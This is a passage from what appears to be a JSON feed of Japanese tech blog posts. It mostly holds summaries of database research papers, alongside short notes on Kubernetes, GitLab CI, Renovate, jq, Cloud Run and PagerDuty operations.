Chaudhuriによる論文Microsoft所属の研究者でRDBMSの研究を行なっており、近年ではCloudにおけるDBMSの研究を行なっている。概要RDBMSが提案された1970年代からクエリ最適化は大規模で幅の広く研究が行なわれてきた。この論文では執筆当時(1998年)までの重要な研究の基礎を説明している。手法探索空間統計情報とコストの推定列挙アルゴリズムアルゴリズムについて説明している。論文内では拡張可能なオプティマイザとして、StarburstとVolcano/Cascadeの2種類のオプティマイザの詳細を論じている。最新(当時)の最適化リアライズドビューについて説明している。作業時間read31:4031:40author33:402:00summary52:5519:15感想ベクトル化やパラレルジョインで扱われていたVolcanoオプティマイザの端に触れることが出来ました。内容としては基礎的な内容が多いものの、知らない概念もいくつかあり引用している論文も読みたいです。クエリ最適化の基礎を学ぶのに非常にいい内容でした。","isoDate":"2023-05-02T01:54:29.000Z","dateMiliSeconds":1682992469000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSとクライアント間におけるデータ転送を最適化する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/14_data_transfer_between_server_and_client","contentSnippet":"この記事の趣旨2017年に出版されたリモートDBMSとクライアント間の大量データ転送を最適化する手法を提案する論文を読みました。Don’t Hold My Data Hostage – A Case For Client Protocol Redesign著者についてMark Raasveldt、Hannes Muhleisenらのグループによる論文。いずれもCentrum Wiskunde & Informaticaの所属で、DuckDBのCxO。DBMSと分析システムにおけるパフォーマンス最適化を研究している。問題意識DBMSからクライアントプログラムに大量のデータを転送することは一般的なタスクである。例えばRやPythonなどを用いた分析システムはしばしばデータベース・インターフェースを利用してデータの取得を行なっている。一方でネットワーク越しにデータを転送することはレイテンシを増加させ、転送時間を長引かせる要因である。そのため分析用途で大量のデータ転送を避け、一部のデータをサンプルとして利用するに止まることが多い。このアプローチはパフォーマンスの低下を押さえられるものの、分析や機械学習の精度を下げることに繋がる。とくに既存のクライアントではネットワークによるレイテンシとスループットの制限に大きな影響を受けパフォーマンスを劣化させる。この問題はデータベースが別マシンやクラウドで動作するときにより大きな問題となる。手法本論文では既存のシリアライズ手法と圧縮手法によるパフォーマンスへの影響を計測し、新しいプロトコルとして以下の特性を持つ手法を提案している。1. チャンク毎のデータ転送と(デ)シリアライゼーション1. ヒューリスティックによる圧縮方法の決定1. text/binaryによるカスタムシリアライゼーションを使用する1. NULL終端によるテキストの取り扱い実験結果提案手法を実装したMonetDB(表内ではMonetDB++)とPostgreSQL(表内ではPostgreSQL++)を既存のDBMSやnetcatと比較することで評価を行なっている。TCP-Hのlineitem、American Community Survay、Airline On-Time Statisticsの3つのデータセットで評価を行なったところ、ローカル通信における非圧縮netcatを除き殆どのケースでMonetDB++系が最良のパフォーマンスを発揮し次点でPostgreSQL++系が優れた結果を残している。Table 10Table 11Table 12PostgreSQLに比べMonetDBが優れている理由はPostgreSQLの行指向データを列指向に変換するコストのためである。作業時間read31:2131:21author35:384:17summary70:1334:35感想論文出版時にはTPC/IPプロトコルが前提でQuic登場前のため、ネットワークプロトコル自体は考慮されていない。現在であればTPC/IPとQuicに適合した手法の比較が行なわれると思うので気になるところ。","isoDate":"2023-05-01T03:34:18.000Z","dateMiliSeconds":1682912058000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"SQL ServerにおけるUDF最適化の論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/13_sql_server_udf_optimization","contentSnippet":"この記事の趣旨2017年に発表されたSQL ServerでUDFを最適化しているFroidという手法についての論文を読みました。Froid: Optimization of Imperative Programs in a Relational Database著者についてKarthik Ramachandra、Kwanghyun Park、K. Venkatesh Emani、Alan Halverson、Cesar Galindo-Legaria、Conor Cunninghamのグループによる論文。ほとんどの著者はMicrosoftに所属しており、いずれもトランザクショナルワークロードでのRDBMSの最適化や分析ワークロードにおけるRDBMS最適化の研究をしている。問題意識RDBMSではSQLによるデータ処理アプローチと、UDFやストアドプロシージャなどによる命令型のデータ処理アプローチを提供している。SQLによるデータアクセスは高度に最適化されてきた一方で、命令型のデータ処理は非効率なため性能を阻害し利用を禁止している組織すらある。UDFによるデータアクセスは非効率であるものの、SQLに比べ下記のような利点を提供するため幅広く利用されているのも事実である。1. SQL間でコードの再利用方法を提供する1. 複雑なビジネスロジックやMLアルゴリズムなどSQLでは難しい表現を可能にする1. 単純なSQLの組み合わせのため、ユーザーの意図が明確に表現できるこれらのメリットを享受するためにRDBMSにおける命令型データアクセス手法のパフォーマンスを向上しする必要があった。手法提案手法であるFroidはMicrosoft SQL Serverにおける命令型コードのパフォーマンス向上の手法として、UDFを複雑なサブクエリとしてみなすアプローチを取っている。UDFを構成する命令はDECLARE、SELECT、IF/ELSE、RETURN、他のUDF、リレーショナルオペレーションの6つに分ることができる。提案手法ではこれらの命令を一般的なT-SQLに置き換え、Apply演算により一つの関係式に結合する方法で実現している。Table 1命令が一般SQLに置き換えられることでUDFに対して、SQLに用いられていた高度な最適化を導入することが出来る。また提案手法ではい以下の理由から、SQLとして命令を置換するときにクエリ最適化時に行なうのではなくバインド時に置換をしている。1. 実際のワークロードでの実験ではほぼ全てのケースでバインド時のほうが性能がよかった1. クエリオプティマイザの変更が不要1. バインディング時に特定の最適化を行なえるとくにクエリオプティマイザの変更はSQL Serverが商用データベースなため重要であった。作業時間read28:5028:50author32:103:20summary57:0024:50","isoDate":"2023-04-28T02:29:05.000Z","dateMiliSeconds":1682648945000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSの歴史とNewSQL","link":"https://zenn.dev/nnaka2992/articles/history_of_db_and_newsql","contentSnippet":"この記事はDBMSの登場以前から現代のDBMSを取り巻く環境までを振り返ることで、なぜNewSQLが必要とされ登場したのかをまとめます。 おことわり筆者はあくまでDBMSユーザーであり、研究者ではないため内容は個人の見解です。また対象読者はある程度DBMSに関わりがあり、OLTPやOLAP、列指向や行指向といった基本的な単語を理解しているものとします。またNewSQLの技術的詳細はスコープ外とします。 DBMS以前データベースという言葉は1950年代に米軍が情報基地を集約したことに由来します。一方で学術的なデータベースの起源はW. C. McGeeが1959年に発表...","isoDate":"2023-04-26T14:28:19.000Z","dateMiliSeconds":1682519299000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"中間結果が莫大になるときの結合を最適化する最悪ケース最適化結合をRDBMSに適応する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/12_worst_case_optimal_join","contentSnippet":"この記事の趣旨2018年に発表された分析ワークロードなどで発生しがちな最終結果に比べ、非常に大きな中間結果を作成してしまうクエリを多方向結合で最適化する論文を読みました。Adopting Worst-Case Optimal Joins in Relational Database Systems著者についてMichael Freitag、Maximilian Bandle、Tobias Schmidt、Alfons Kemper、Thomas Neumannによるグループの論文いずれの著者もDBMSにおける最適化を中心に研究しており、それぞれ分析ワークロードにおける最適化や最新のハードウェアにおける最適化などを研究している。問題意識従来のRDBMSにおける結合処理のほとんどはバイナリ結合に依存して複数のリレーションにまたがるクエリを処理してきた。数十年に渡る研究によりバイナリ結合は幅広い柔軟性と優れた性能を発揮するようになった。その一方でバイナリ結合による実行計画は特定のワークロードでは最適ではないケースを示すことが知られている。主な原因として実際のクエリ結果に比べて非常に大きな中間結果を生成するためである。とくにPK以外のキーによる結合が多くなる分析ワークロードではそのような状態を避けることが難しく、またグラフ分析のようなクエリパターンでも多く見られる。近年の論理的な進歩により中間結果の列挙を避ける多方向結合のアルゴリズムが開発可能になった。この手法はバイナリ結合計画より優れた実行時間を保証できるため、RDBMSの堅牢性を大幅に向上させる可能性を持っている。しかし現状最悪ケース最適化結合アルゴリズムでは以下のような問題を抱えている。1. 膨大なストレージとメンテナンスを必要とする結合に参加出来るカラムを含むインデックスを必要とする。1. RDBMSは挿入と更新のサポートが必要なものの、既存のアルゴリズムは高価な事前計算を必要とする。そのため本論文は以下の制約を満たすアプローチを提案している1. 多方向結合が有益な場合のみ多方向結合を使用するオプティマイザを必要とする。1. 実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。手法提案手法では比較ベースではなくハッシュベースの結合のため、2の「実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。」という要素の考慮を除いている。またオプティマイザについては既存のコストベースのものを拡張し適応している。提案手法では潜在的に成長している結合のカスケードを最悪の場合の最適結合に置き換えることで、最適化されたバイナリ結合計画を洗練させるヒューリスティックなアプローチを提案している。通常の結合順序最適化で使用されるのと同じカーディナリティ推定値に基づいて、中間テーブルが膨大になる結合を特定する。作業時間read22:1322:13author25:483:35summary52:5826:50感想とても難しい内容に感じてしまい、殆ど頭を通りすぎてしまった気がする。今まで最適化は触れずに来たため、理解が浅い領域だった。よくよく考えるとDBMSの話しに最適化が登場するのはあたりまえなので、今後はその方面にも触れて行きたい。","isoDate":"2023-04-26T02:06:46.000Z","dateMiliSeconds":1682474806000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"マルチコアメインメモリにおけるソートジョインとハッシュジョインのパフォーマンスを検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/11_join_performance_comparison","contentSnippet":"この記事の趣旨2013年に発表された\\"Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited\\"という論文を読みました。当時最新のアルゴリズムとハードウェアにおける、ソートとハッシュによる結合のパフォーマンスを比べた論文です。Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited著者についてCagri Balkesen、Gustavo Alonso、Jens Teubner、M. Tamer Ozsuらのグループによる論文いずれもDBMSにおけるクエリ最適化やビッグデータにおけるパフォーマンスを研究している。またGustavo Alonsoはハードウェアや分散システムもメインのフィールドとしている。問題意識DBMSにおいて常にソートマージとハッシュ結合の性能比較が行われており、最新の研究ではSIMDやNUMAへの適正に基づいてソートマージがより優れていると結論づけられていた。しかしこれらの分野は常に研究が重ねられ、過去の検証時には登場していなったハッシュ結合の最適化手法が生れた。この論文ではそれらを適用し再度ソートマージとハッシュ結合の性能比較を行なう。手法本論文では以下に分けて結合手法の評価を行なっている。1. ソートフェーズの評価SIMDソートアルゴリズムとC++のSTLソートアルゴリズムを比較している。マージフェーズの評価入力サイズの調整によるマージフェーズの最適化パーマンスを検証している。ソートマージジョインにおける影響要因の特定結果結合対象のデータサイズに拘わらずハッシュによる結合がソートベースの結合のパフォーマンスを上回っている。Figure 14ソートマージによる結合は入力サイズが著しく大きくなったときのみハッシュ結合のパフォーマンスに近づく。Figure 15ソートマージ、ハッシュ結合におけるデータの偏りはパフォーマンスに大きな影響を及ぼさなかった。Figure 16いずれのアルゴリズムも物理的なコア数では線形にスケールした。Figure 17作業時間read23:1123:11author27:093:58summary60:1232:57","isoDate":"2023-04-24T02:23:54.000Z","dateMiliSeconds":1682303034000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"RDBでの結合手法を比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/10_join_method_comparison","contentSnippet":"この記事の趣旨2016年に発表された\\"An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory\\"という論文を読みました。様々な結合手法を包括的に比較した論文でどのような結合方法がどのような時に適しているかを示しています。An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory著者についてStefan Schuh、Xiao Chen、Jens Dittrichのグループによる論文。いずれもDBMSや分析システム、Hadoopなどにおける検索高速化・最適化の研究を行なっている。問題意識関係結合はほとんど全てのクエリプランにおいて中核をなす処理であり、定期的に研究・改良され再検討されてきた。新たな手法が提案され実験を行なわれるものの、それぞれ結果において比較を困難にする要素や幾らかの矛盾を孕んでいた。例えば同じハッシュベースの結合アルゴリズムの比較でも実装が異なったり、複数の論文でパフォーマンス比較で正反対の結果を示しているためである。そのため単純に論文執筆時点で最も高速な結合アルゴリズムを結論づけることが困難であった。手法本論文では結合方法を以下の3つに分類した1. パーティションベースハッシュジョインパーティションに分割し結合する手法。ハッシュテーブルの構築と結合されるデータの探索のキャッシュミスを最小にする事を目的としている。非パーティションベースハッシュジョインパーティションテーブルを構築しながら結合を行なう手法で、マルチスレッドと順番に依存しない実行によりキャッシュミスのパフォーマンス劣化を隠蔽している。ソートマージジョインSIMDによりベクトル化される。検証ではこれらの結合方法を以下の3つのテストで使用するために、全部で13のアルゴリズムを検証している。1. ブラックボックス比較ブラックボックス的に比較する。ホワイトボックス比較ブラックボックス比較で検証する結合方法に先行研究で示された最適化を施した上で比較を行なう。パラレルラディックスジョイン比較Table 2結果パーティション結合の一種であるリモート書込みを排除したCPR系アルゴリズムは小さな入力に対して有効ではないスケールの大きい結合ではとくに理由が無い場合、パーティションベースのジョインを利用する大きなサイズのページを利用するソフトウェアライトコンバインバッファ()を利用するパーティションジョインでは適切なパーティションビットを利用するできるかぎりシンプルなアルゴリズムを利用するNUMAを考慮したアルゴリズムを利用する実行時間とクエリ時間は同一ではない作業時間read31:3431:34author35:183:46summary77:5042:32","isoDate":"2023-04-23T14:16:28.000Z","dateMiliSeconds":1682259388000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"コンパイルとベクトル化による最適化のパフォーマンスを比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/9_compile_vs_vectorize_performance","contentSnippet":"この記事の趣旨2018年に発表された\\"Everything You Always Wanted to Know AboutCompiled and Vectorized Queries But Were Afraid to Ask\\"という論文を読みました。最新のクエリエンジンの特性をまとめ、どのようなワークロードに向くのかという指針を示すないようです。Everything You Always Wanted to Know About Compiled and Vectorized Queries But Were Afraid to AskTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Boncz著者についてTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Bonczのグループによる論文。いずれも大規模データにおけるクエリパフォーマスや最適化に関する研究を行なっている。問題意識分析ワークロードに向いた最新のクエリエンジンはベクトル化またはデータ中心のコード生成に基づいている。どちらのモデルも従来のエンジンに比べオーバーヘッドが少く、非常に効率的なものの概念的には大きく異なっている。この2つのモデルの違いは、DBMSの実行エンジンのソースコードの構成とその性能特性を決定する基本的なもので、クエリ実行モデルを超える多くの設計で異なる。本論文はことなる2つのモデルを再実装し、環境差異のないマシンで実行することでそれぞれのモデルがどのように違うのか。どのような用途に最適なのかを検証している。手法検証手法は著者らがC++で再実装したデータ中心モデルの「Taper」とベクトル化中心の「Tectorwise」を同一のマシンでパフォーマンス検証を行っている。検証項目は以下から成る1. インメモリOLAPワークロードでのマイクロアーキテクチャ分析1. SIMDの利点の検証1. マルチコアCPUにおけるクエリ並列化1. 異なるハードウェアでのパフォーマンス結果インメモリOLAPワークロードでのマイクロアーキテクチャ分析Figure 3: Performance – TPC-H SF=1, 1 threadSIMDの利点の検証SIMDを評価するにはTectorwiseのみを用いた。SIMDではスカラーなデータをベクトルに変換するペナルティは少く、最大8.4倍の性能向上が確認された。Figure 6: Scalar vs. SIMD Selection in TectorwiseマルチコアCPUにおけるクエリ並列化異なるハードウェアでのパフォーマンスIntel Skylake、Intel Knights Landing、AMD Ryzenで対照実験を行なったものの、いずれのハードウェアでもTyper、Tectorwiseともに有効に動作した。作業時間read29:2629:26author33:233:57summary76:3742:44感想VoectorwiseとHyperのいずれを使うべきか。どちらが優れているかといった疑問に答えるないようだった。","isoDate":"2023-04-21T01:45:06.000Z","dateMiliSeconds":1682041506000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Renovateをローカルで動かす","link":"https://kechigon.hatenablog.com/entry/2023/04/20/140449","contentSnippet":"Renovateには様々な実行方法がありますが。ここではローカルで動かす方法について説明します。Renovateをクローンするhttps://github.com/renovatebot/renovateからクローンしましょう。これ以降はクローンしたリポジトリのルートディレクトリで作業します。実行環境コンテナ.devcontainer/Dockerfileをビルドします。docker build -f .devcontainer/Dockerfile -t renovatebot_local .Renovateの依存パッケージをインストールdocker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app renovatebot_local yarnローカル実行時のオプションドキュメントを参考に、引数を与えてください。ログレベルdebugでGitLabリポジトリに対して実行する場合は、以下のようになります。例：docker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app -e LOG_LEVEL=debug -e GITHUB_COM_TOKEN=*** renovatebot_local yarn start --platform gitlab --token *** {リポジトリ}※{リポジトリ}のところはユーザー名/リポジトリ名のような感じです。","isoDate":"2023-04-20T05:04:49.000Z","dateMiliSeconds":1681967089000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/8_counter_control_flow_divergence_in_compiled_query_pipelines","contentSnippet":"この記事の趣旨2020年に提案された\\"Make the most out of your SIMD investments: counter control flowdivergence in compiled query pipelines\\"という論文を読みました。SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文です。Make the most out of your SIMD investments: counter control flow divergence in compiled query pipelinesHarald Lang, Linnea Passing, Andreas Kipf, Peter Boncz, Thomas Neumann, Alfons Kemper著者についてHarald Lang、 Linnea Passing、 Andreas Kipf、 Peter Boncz、 Thomas Neumann、 Alfons Kemperのグループによる研究いずれも最新のアーキテクチャでのクエリ最適化やデータ分析における検索手法などを研究している。問題意識CPUの発展にともないあたらしいCPUアーキテクチャが登場した。Single Instruction Multiple Data(SIMD)ではRDBはSIMDによるベクトル処理能力の向上により、クエリコンパイラの実行パイプライン全体をベクトル化して高度なデータ並列性の恩恵を受けることが出来るようになった。一方でクエリ全体をベクトル化して実行することで、SIMDによるクエリ評価が忙しくなる。SIMD評価で結果に寄与しない評価が単純にオーバーヘッドとなってしまう。手法本論文ではリフィルアルゴリズムとそのアルゴリズムをクエリパイプラインプランに統合する手法で上記の問題の解決を試みている。リフィルアルゴリズムは基本的に新しい要素を宛先レジスタの希望する位置にコピーするアルゴリズムで、メモリからレジスタとレジスタからレジスタへのコピーの2パターンが存在する。クエリパイプラインプランに統合するリフィル戦略ではConsume EverythingパターンとPartial Consumeパターンが存在する。Consum Everything戦略は、タプルをバッファリングするために使用される追加のベクターレジスタを割り当てる方法で利用率が低い場合、オペレータはこれらのタプルの処理を延期する。つまり、この反復ではボディは実行されず(条件が満たされない場合)、代わりにアクティブなタプルがこれらのバッファレジスタに移動することになる。Partial Consume戦略ではconsume()コードを入力の一部に適用する方法で、制御フローを前のオペレータに戻し、アクティブなデータ断片のみをベクトルレジスタに残すことで実行を延期している。作業時間read29:4029:40author33:404:00summary60:0426:36感想前回に引続き個人的には難しいと感じる論文だった。2000年前後の提案にくらべ、2015年前後の論文ではハードウェアアーキテクチャを中心とした手法がピックアップされている。単純に自分の知識不足、理解力不足なので勉強するしかない。","isoDate":"2023-04-20T02:00:20.000Z","dateMiliSeconds":1681956020000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"おうちk8sクラスターを構築していて詰まったところ","link":"https://kechigon.hatenablog.com/entry/2023/04/17/174444","contentSnippet":"おうち Kubernetes インターンを参考に機材調達->OSインストール->kubeadamでクラスター構築と一通りやってみたので、トラブったところと解決策を共有します。USBメモリRaspberry PiにOSをインストールする際に、SDカードの性能が悪いと失敗します。私は安物で済ませようとした結果、三枚目でようやく成功しました。またインストール後も、ディスクの読み書き速度は全体のパフォーマンスに影響を与えるので、性能にはこだわるべきです。以下のサイトなどを参考に選びましょう。https://www.kingston.com/jp/blog/personal-storage/memory-card-speed-classeshttps://osusumepc.com/raspberry-pi-microsd/cgroups の Memory Subsystem を有効化私がインストールしたOSでは、cgroups の Memory Subsystem がデフォルトで無効化されているため、/boot/firmware/cmdline.txtに下記を追加する必要がありました。cgroup_memory=1 cgroup_enable=memoryしかし、編集し再起動しても有効化されませんでした。原因は改行を入れて追加していたことでした。改行せず行末に追加するのが正しいです。","isoDate":"2023-04-17T08:44:44.000Z","dateMiliSeconds":1681721084000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"コンテナイメージのマルウェア検出とその実用性について","link":"https://speakerdeck.com/kyohmizu/kontenaimezinomaruueajian-chu-tosonoshi-yong-xing-nituite","contentSnippet":"3-shake SRE Tech Talk #5 ~ コンテナセキュリティ最前線 の資料です。\\rhttps://3-shake.connpass.com/event/277945/","isoDate":"2023-04-12T04:00:00.000Z","dateMiliSeconds":1681272000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetes の Probe の仕組みと考慮点","link":"https://zenn.dev/toversus/articles/5d1292160f5035","contentSnippet":"!Kubernetes 1.26 時点の話で、以降のマイナーバージョンで改善されている可能性があります。Kubernetes には、ワークロードの正常性を確認するための Probe という仕組みがあり、Liveness / Readiness / Startup Probe が用意されています。kubelet (Kubernetes のノード上で動作するエージェント) は、ワークロードに対して TCP Socket / HTTP GET / gRPC / Exec の中から指定されたチェックを定期的に実行します。それぞれの Probe の特性を理解して使い分けないとサービスに影響...","isoDate":"2023-04-10T02:20:29.000Z","dateMiliSeconds":1681093229000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitLab CI で artifacts:reports:dotenv を使って Job をまたいで変数を渡す","link":"https://blog.1q77.com/2023/04/gitlab-ci-artifacts-report-dotenv/","contentSnippet":"GitLab CI である Job で変数を定義して、それを後続の Job でも使いたいなと思って調べていたらartifacts:reports:dotenv にたどり着いたのでメモ。使用例 1 2 3 4 5 6 7 8 91011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980stages: - stage1 - stage2 - stage3 - stage4job1: stage: stage1 script: - echo \\"MY_VAR1=first-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env# job1 と job2 で使用するファイル名が重複しても別物なので問題ないjob2: stage: stage2 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=second-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env needs: - job: job1 artifacts: true# needs で指定しているので MY_VAR1 も MY_VAR2 も渡されるjob3_1: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true - job: job2 artifacts: true# needs で job1 だけを指定しているので MY_VAR1 だけ渡されるjob3_2: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true# needs を指定しないと MY_VAR1 も MY_VAR2 も両方渡されるjob3_3: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\"# needs で job1 が指定されているが artifacts は false なので# MY_VAR1 も MY_VAR2 も渡されないjob3_4: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false# MY_VAR2 だけ受け取れるjob3_5: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false - job: job2 artifacts: truehttps://gitlab.com/gitlab-org/gitlab/-/issues/22638","isoDate":"2023-04-04T16:27:22.000Z","dateMiliSeconds":1680625642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Orbstack を Docker Desktop の代わりに使う","link":"https://blog.1q77.com/2023/04/orbstack/","contentSnippet":"きっかけbrew update して新しく追加された formula を眺めるのが最近のちょっとした楽しみ— yteraoka (@yteraoka) January 12, 2023で、orbstack っていう formula が追加されてるのを見てほー、そんなものが、ということで試してみる。","isoDate":"2023-04-04T13:17:51.000Z","dateMiliSeconds":1680614271000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy の externalTrafficPolicy=Local の改善","link":"https://zenn.dev/toversus/articles/6eeb3b708bdff3","contentSnippet":"tl;dr;Service type LoadBalancer の externalTrafficPolicy: Local は、Kubernetes 1.26 まで Pod のローリング更新時にトラフィックが喪失する問題があるので注意kubernetes-sigs/cloud-provider-kind は、ローカル環境でクラウドリソース (現在は LB のみ) が絡む処理をシミュレートできて便利GKE Dataplane v2 を利用している場合、GKE 1.26.1 時点で Cilium に externalTrafficPolicy: Local の改善が入ってい...","isoDate":"2023-03-29T01:31:20.000Z","dateMiliSeconds":1680053480000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"PagerDuty で一定期間アラートを抑制する","link":"https://zenn.dev/toshikish/articles/6958af565e6c65","contentSnippet":"PagerDuty でアラートを受け取っているプロジェクトで，以下のようにある時間帯はアラートを止めたいケースがあります。メンテナンスが予定されている。開発環境は営業時間内だけ動かすので，平日夜や土日祝日は止めたい。何も対策しないとアラートが鳴ってしまい，オンコール担当者を不用意に呼び出す結果になるので，そうならないようにきちんと設定します。 TL;DR各ケースで以下のように設定します。メンテナンス→メンテナンスウィンドウを設定平日夜・土日停止→曜日・時刻ベースのイベントルールを追加 方法1：メンテナンスウィンドウメンテナンスなどでダウンする時間帯があらかじ...","isoDate":"2023-03-27T08:38:39.000Z","dateMiliSeconds":1679906319000,"authorName":"toshikish","authorId":"toshikish"},{"title":"jq commandの select でハマった話","link":"https://zenn.dev/satohjohn/articles/79faafa55e9a1e","contentSnippet":"結論配列のjsonに対してselectする際には、配列を一度オブジェクトの抽出をしないと複製されてしまう。なので、以下ではなくjq -r  \'select(.[].A | contains(\\"特定文字列\\")) | .[].B\' test.jsonこうしないといけないjq -r  \'.[] | select(.A | contains(\\"特定文字列\\")) | .B\' test.json 環境$ jq --version   jq-1.6 詰まった内容以下のjson(test.json)があったときにtest.json[    {        \\"hog...","isoDate":"2023-03-25T16:36:44.000Z","dateMiliSeconds":1679762204000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetes と名前解決","link":"https://zenn.dev/toversus/articles/d9faba80f68ea2","contentSnippet":"tl;dr外部サービスのホスト名の末尾に . (ドット) を必ず指定しましょう。✅\xa0google.com.❌\xa0google.com末尾にドットを指定できない (e.g. SDK 組み込み) かつ大量の名前解決が発生している場合は、Pod の DNS Config の options で ndots: 1 を指定しましょう。Kubernetes の名前解決の仕組みを理解していないと、各ノードの conntrack テーブルが溢れてパケットが破棄され、サービスに影響が出ることがあります。 背景アプリケーションが外部のサービスを呼び出す場合、ホスト名を IP アド...","isoDate":"2023-03-22T07:36:38.000Z","dateMiliSeconds":1679470598000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"cloud runの要らなくなったリビジョンを消す","link":"https://zenn.dev/satohjohn/articles/2a769b8280427d","contentSnippet":"小ネタです。運用をしていて、たくさんリリースしているとリビジョンが増えていることとかもあるかなと思いますが、コンソール上から消すのも面倒なので、コマンドで消しましょう。というか、解説することもないので、結論と詰まった部分だけ残しておきます。 結論 ACTIVEじゃないものをすべて消す#!/bin/bashSERVICE_NAME=$1revisions=$(    gcloud run revisions list --service=$SERVICE_NAME \\\\    --filter=\\"status.conditions.type:Active AND s...","isoDate":"2023-03-21T02:35:43.000Z","dateMiliSeconds":1679366143000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Datadog Agent からの Metrics を Victoria Metrics で受ける","link":"https://blog.1q77.com/2023/03/send-datadog-metrics-to-victoriametrics/","contentSnippet":"Victoria Metrics は v1.67.0 で Datadog Agent からのメトリクスを受け取れるようになっているので今回はこれを試してみる。Victoria Metrics のドキュメント How to send data from DataDog agentSingle node Instance をセットアップVictoria Metrics はクラスタリング構成も可能だが今回は Single node のサーバーで検証。","isoDate":"2023-03-19T12:38:04.000Z","dateMiliSeconds":1679229484000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Azure Bicep で Storage Account の SSE を設定する","link":"https://zenn.dev/kyohei_saito/articles/fb102fd2af31e2","contentSnippet":"Azure Bicep で Storage Account の SSE (サーバー側暗号化) を設定してみようとしたところ、思ったより難しかったのと、やりたいことそのままのサンプルコードがなかったため、調査した内容を公開してみます。 この記事で書いてあることAzure Bicep を使用して Storage Account の SSE を設定する方法 サンプルコード早く使い方とコードを見たい、という方向けにまずはサンプル コードについて記載します。この記事で説明するサンプル コードの全体は下記を参照ください。https://github.com/kiyo-s/crea...","isoDate":"2023-03-19T04:44:58.000Z","dateMiliSeconds":1679201098000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"k8s.gcr.io の凍結対応から学んだことメモ","link":"https://zenn.dev/kyohei_saito/articles/d0080d94dae0b7","contentSnippet":"今まで Kubernetes プロジェクトのコンテナ イメージをホストしていたイメージ レジストリ k8s.gcr.io が凍結されることが発表されました。この記事では、k8s.gcr.io から registry.k8s.io に移行する過程で学んだことについて、備忘としてメモします。 この記事で書いてあることk8s.gcr.io から registry.k8s.io に移行した流れhelm で、dependencies によって外部の chart を install している場合に、外部の chart の values を設定する方法skopeo によりローカルで ...","isoDate":"2023-03-18T19:08:14.000Z","dateMiliSeconds":1679166494000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Terraform] aws_networkfirewall_firewall リソースから VPC エンドポイント ID を取り出す","link":"https://zenn.dev/toshikish/articles/fc08c2021811f9","contentSnippet":"はじめにTerraform を使って AWS Network Firewall のファイアウォールを作るとき，生成された VPC エンドポイントの ID をサブネットのルートテーブルのルートに追加するのは自然な流れですが，VPC エンドポイント ID を取り出すのが大変だったので，やり方を記録しておきます。例えば以下のように aws_networkfirewall_firewall リソースを定義したとします。（特に説明のない変数やリソースは，なんとなくの理解で構いません。）resource \\"aws_networkfirewall_firewall\\" \\"firewall\\" ...","isoDate":"2023-03-16T07:58:23.000Z","dateMiliSeconds":1678953503000,"authorName":"toshikish","authorId":"toshikish"},{"title":"振り返り (2020 - 2022)","link":"https://zenn.dev/toversus/articles/8557a7fb2bc15c","contentSnippet":"コロプラに 2020/3/1 に入社して、2023/2/28 